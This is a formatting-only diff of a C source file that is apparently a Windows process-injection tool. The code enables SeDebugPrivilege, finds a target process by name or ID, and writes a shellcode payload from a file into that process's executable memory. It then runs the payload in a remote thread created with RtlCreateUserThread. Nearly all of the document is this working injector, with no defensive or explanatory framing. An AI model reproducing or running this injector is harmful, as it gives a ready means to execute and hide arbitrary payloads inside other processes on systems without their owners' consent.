@@ -31,126 +31,132 @@
 
 #include "inject.h"
 
-BOOL EnablePrivilege(PCHAR szPrivilege){
-    HANDLE           hToken;
-    BOOL             bResult;
-    LUID             luid;
+BOOL EnablePrivilege(PCHAR szPrivilege) {
+    HANDLE hToken;
+    BOOL bResult;
+    LUID luid;
     TOKEN_PRIVILEGES tp;
 
     // open token for current process
-    bResult = OpenProcessToken(GetCurrentProcess(),
-      TOKEN_ADJUST_PRIVILEGES, &hToken);
-    
-    if(!bResult) return FALSE;
-    
+    bResult = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+
+    if (!bResult)
+        return FALSE;
+
     // lookup privilege
     bResult = LookupPrivilegeValue(NULL, szPrivilege, &luid);
-    if(bResult){
-      tp.PrivilegeCount           = 1;
-      tp.Privileges[0].Luid       = luid;
-      tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (bResult) {
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-      // adjust token
-      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
+        // adjust token
+        bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
     }
     CloseHandle(hToken);
     return bResult;
 }
 
 // display error message for last error code
-VOID xstrerror (PCHAR fmt, ...){
-    PCHAR  error=NULL;
+VOID xstrerror(PCHAR fmt, ...) {
+    PCHAR error = NULL;
     va_list arglist;
-    CHAR   buffer[1024];
-    DWORD   dwError=GetLastError();
-    
+    CHAR buffer[1024];
+    DWORD dwError = GetLastError();
+
     va_start(arglist, fmt);
     vsnprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
-    va_end (arglist);
-    
-    if (FormatMessage (
-          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
-          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
-          (LPSTR)&error, 0, NULL))
-    {
-      printf("  [ %s : %s\n", buffer, error);
-      LocalFree (error);
+    va_end(arglist);
+
+    if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
+                      NULL,
+                      dwError,
+                      MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+                      (LPSTR)&error,
+                      0,
+                      NULL)) {
+        printf("  [ %s : %s\n", buffer, error);
+        LocalFree(error);
     } else {
-      printf("  [ %s error : %08lX\n", buffer, dwError);
+        printf("  [ %s error : %08lX\n", buffer, dwError);
     }
 }
 
-DWORD name2pid(PCHAR procName){
-    HANDLE         hSnap;
+DWORD name2pid(PCHAR procName) {
+    HANDLE hSnap;
     PROCESSENTRY32 pe32;
-    DWORD          pid=0;
-    
+    DWORD pid = 0;
+
     // create snapshot of system
     hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if(hSnap == INVALID_HANDLE_VALUE) return 0;
-    
+    if (hSnap == INVALID_HANDLE_VALUE)
+        return 0;
+
     pe32.dwSize = sizeof(PROCESSENTRY32);
 
     // get first process
-    if(Process32First(hSnap, &pe32)){
-      do {
-        if(!lstrcmpi(pe32.szExeFile, procName)){
-          pid=pe32.th32ProcessID;
-          break;
-        }
-      } while(Process32Next(hSnap, &pe32));
+    if (Process32First(hSnap, &pe32)) {
+        do {
+            if (!lstrcmpi(pe32.szExeFile, procName)) {
+                pid = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(hSnap, &pe32));
     }
     CloseHandle(hSnap);
     return pid;
 }
 
 BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
-    SIZE_T                wr;
-    HANDLE                hp,ht;
-    LPVOID                cs;
+    SIZE_T wr;
+    HANDLE hp, ht;
+    LPVOID cs;
     RtlCreateUserThread_t pRtlCreateUserThread;
-    HMODULE               hn;
-    CLIENT_ID             cid;
-    NTSTATUS              nt=~0UL;
-    DWORD                 t;
-    
-    // 1. resolve API address 
+    HMODULE hn;
+    CLIENT_ID cid;
+    NTSTATUS nt = ~0UL;
+    DWORD t;
+
+    // 1. resolve API address
     hn = GetModuleHandle("ntdll.dll");
-    pRtlCreateUserThread=(RtlCreateUserThread_t)
-        GetProcAddress(hn, "RtlCreateUserThread");
-    
+    pRtlCreateUserThread =
+        (RtlCreateUserThread_t)GetProcAddress(hn, "RtlCreateUserThread");
+
     printf("  [ opening process %li\n", id);
     // 2. open the target process
-    hp=OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
-    
-    if(hp == NULL) return FALSE;
-    
+    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
+
+    if (hp == NULL)
+        return FALSE;
+
     // 3. allocate executable-read-write (XRW) memory for payload
     printf("  [ allocating memory for payload.\n");
-    cs=VirtualAllocEx(hp, NULL, codeLen, 
-      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    
+    cs = VirtualAllocEx(hp,
+                        NULL,
+                        codeLen,
+                        MEM_COMMIT | MEM_RESERVE,
+                        PAGE_EXECUTE_READWRITE);
+
     printf("  [ writing code to %p.\n", cs);
     // 4. copy the payload to remote memory
-    WriteProcessMemory(hp, cs, code, codeLen, &wr); 
+    WriteProcessMemory(hp, cs, code, codeLen, &wr);
     VirtualProtectEx(hp, cs, codeLen, PAGE_EXECUTE_READ, &t);
-    
+
     printf("  [ press any key to continue.\n");
     getchar();
-    
+
     // 5. execute payload in remote process
     printf("  [ creating new thread.\n");
-    nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
-      NULL, cs, NULL, &ht, &cid);
-    
-    //AttachConsole(id);
-    
+    nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, NULL, cs, NULL, &ht, &cid);
+
+    // AttachConsole(id);
+
     printf("  [ nt status is %lx\n", nt);
     WaitForSingleObject(ht, INFINITE);
-    
+
     // 6. close remote thread handle
     CloseHandle(ht);
-    
+
     // 7. free remote memory
     printf("  [ freeing memory.\n");
     VirtualFreeEx(hp, cs, codeLen, MEM_RELEASE | MEM_DECOMMIT);
@@ -160,53 +166,53 @@ BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
     return nt == 0; // STATUS_SUCCESS
 }
 
-DWORD getdata(PCHAR path, LPVOID *data){
+DWORD getdata(PCHAR path, LPVOID *data) {
     HANDLE hf;
-    DWORD  len,rd=0;
-    
+    DWORD len, rd = 0;
+
     // 1. open the file
-    hf=CreateFile(path, GENERIC_READ, 0, 0,
-      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-      
-    if(hf!=INVALID_HANDLE_VALUE){
-      // get file size
-      len=GetFileSize(hf, 0);
-      // allocate memory
-      *data=malloc(len + 16);
-      // read file contents into memory
-      ReadFile(hf, *data, len, &rd, 0);
-      CloseHandle(hf);
+    hf = CreateFile(path, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hf != INVALID_HANDLE_VALUE) {
+        // get file size
+        len = GetFileSize(hf, 0);
+        // allocate memory
+        *data = malloc(len + 16);
+        // read file contents into memory
+        ReadFile(hf, *data, len, &rd, 0);
+        CloseHandle(hf);
     }
     return rd;
 }
 
-int main(int argc, char *argv[]){
+int main(int argc, char *argv[]) {
     LPVOID code;
     SIZE_T code_len;
-    DWORD  pid;
+    DWORD pid;
 
-    if (argc != 3){
-      printf("\n  [ usage: inject <process id | process name> <loader.bin>\n");
-      return 0;
+    if (argc != 3) {
+        printf("\n  [ usage: inject <process id | process name> <loader.bin>\n");
+        return 0;
     }
-    
-    if(!EnablePrivilege(SE_DEBUG_NAME)) {
-      printf("  [ cannot enable SeDebugPrivilege.\n");
+
+    if (!EnablePrivilege(SE_DEBUG_NAME)) {
+        printf("  [ cannot enable SeDebugPrivilege.\n");
     }
-    
+
     // get pid
-    pid=atoi(argv[1]);
-    if(pid==0) pid=name2pid(argv[1]);
-    
-    if(pid==0) {
-      printf("  [ unable to obtain process id.\n");
-      return 0;
+    pid = atoi(argv[1]);
+    if (pid == 0)
+        pid = name2pid(argv[1]);
+
+    if (pid == 0) {
+        printf("  [ unable to obtain process id.\n");
+        return 0;
     }
     // pic
     code_len = getdata(argv[2], &code);
-    if(code_len == 0) {
-      printf("  [ unable to read payload.\n");
-      return 0;
+    if (code_len == 0) {
+        printf("  [ unable to read payload.\n");
+        return 0;
     }
     injectPIC(pid, code, code_len);
     free(code);
